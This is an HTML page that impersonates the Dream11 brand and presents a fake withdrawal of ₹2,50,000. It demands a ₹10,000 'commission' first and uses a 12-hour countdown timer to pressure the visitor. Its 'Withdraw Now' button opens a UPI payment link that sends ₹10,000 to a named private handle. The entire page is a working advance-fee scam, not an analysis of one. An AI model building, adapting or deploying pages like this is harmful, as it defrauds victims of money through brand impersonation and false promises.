<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Withdrawal Page</title>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background-color: #d60000;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
    }

    .container {
      background-color: white;
      padding: 30px 20px;
      border-radius: 20px;
      box-shadow: 0 8px 16px rgba(0,0,0,0.3);
      text-align: center;
      width: 90%;
      max-width: 360px;
    }

    .logo {
      width: 50px;
      margin-bottom: 5px;
    }

    .dream11 {
      font-size: 18px;
      font-weight: bold;
      color: #d60000;
      margin-bottom: 10px;
    }

    h2 {
      margin: 10px 0;
    }

    .amount {
      font-size: 32px;
      color: #28a745;
      font-weight: bold;
    }

    .info {
      font-size: 15px;
      margin: 15px 0;
    }

    .timer {
      font-size: 18px;
      color: red;
      font-weight: bold;
      margin-bottom: 20px;
    }

    .btn {
      background-color: #28a745;
      color: white;
      font-size: 16px;
      padding: 12px 28px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
    }

    .btn:hover {
      background-color: #218838;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="1000076821.jpg" alt="Dream11 Logo" class="logo" />
    <div class="dream11">DREAM11</div>
    <h2>Withdrawal Page</h2>
    <p>Your withdrawal amount is:</p>
    <div class="amount">₹2,50,000</div>
    <p class="info">You must pay ₹10,000 commission to proceed with withdrawal.</p>
    <div class="timer" id="countdown">Time left: 12:00:00</div>
    <button class="btn" id="withdrawBtn">Withdraw Now</button>
  </div>

  <script>
    // Countdown logic
    let totalSeconds = 12 * 60 * 60;
    const countdownEl = document.getElementById("countdown");

    function updateCountdown() {
      const hours = Math.floor(totalSeconds / 3600);
      const minutes = Math.floor((totalSeconds % 3600) / 60);
      const seconds = totalSeconds % 60;

      countdownEl.textContent = `Time left: ${hours.toString().padStart(2, '0')}:${minutes
        .toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;

      if (totalSeconds > 0) {
        totalSeconds--;
      }
    }

    setInterval(updateCountdown, 1000);

    // Withdraw Button Click
    document.getElementById("withdrawBtn").addEventListener("click", () => {
      window.location.href = "upi://pay?pa=ramchoudhary2315@ybl&pn=Ram%20Choudhary&am=10000&cu=INR";
    });
  </script>
</body>
</html>
